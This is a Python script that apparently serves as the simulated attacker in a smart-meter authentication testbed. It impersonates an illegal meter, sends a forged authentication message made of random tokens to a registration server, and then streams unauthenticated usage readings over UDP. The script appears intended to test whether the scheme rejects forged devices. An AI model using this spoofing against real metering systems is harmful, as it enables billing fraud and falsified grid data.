# malicious_client.py
# Fake / Illegal Smart Meter
# Sends fabricated authentication + usage traffic

import socket
import json
import time
import random
import sys
import os
import secrets

SP_IP = "10.0.3.1"
SP_PORT = 9999
REG_PORT = 9998
SEND_INTERVAL = 3


def run_fake_sender(fake_sm_id):
    print(f"[!] Illegal Smart Meter {fake_sm_id} starting")

    # ------------------------------------------------
    # FAKE AUTH PAYLOAD (NO PUF, NO REAL CRYPTO)
    # ------------------------------------------------
    fake_auth_payload = {
        "device_id": fake_sm_id,
        "m1": secrets.token_hex(16),          # random nonce
        "sigma_sm": secrets.token_hex(32),    # fake HMAC
        "timestamp": time.time(),
        "note": "FABRICATED_AUTH"
    }

    # Guess REG based on SM id pattern
    try:
        sm_num = int(fake_sm_id[2:])
        reg_ip = "10.0.1.254" if sm_num <= 5 else "10.0.2.254"
    except:
        reg_ip = "10.0.1.254"

    # ------------------------------------------------
    # SEND FAKE AUTH TO REG
    # ------------------------------------------------
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((reg_ip, REG_PORT))
        sock.sendall(json.dumps(fake_auth_payload).encode())
        sock.close()

        print(f"[ATTACK → REG] Fake auth sent to {reg_ip}:{REG_PORT}")
    except Exception as e:
        print(f"[ATTACK] Auth send failed: {e}")

    # ------------------------------------------------
    # SEND USAGE ANYWAY (BYPASS ATTEMPT)
    # ------------------------------------------------
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print("[!] Attempting usage transmission without valid auth")

    try:
        while True:
            payload = {
                "smId": fake_sm_id,
                "usage": round(random.uniform(5.0, 15.0), 2),  # abnormal range
                "proto": "udp",
                "service": "-",
                "timestamp": time.time()
            }

            udp_sock.sendto(json.dumps(payload).encode(), (SP_IP, SP_PORT))
            print(f"[ATTACK → SP] usage={payload['usage']} kWh (unauth)")
            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        print("\n[!] Illegal Smart Meter stopped")
        udp_sock.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 malicious_client.py smX")
        sys.exit(1)

    run_fake_sender(sys.argv[1])
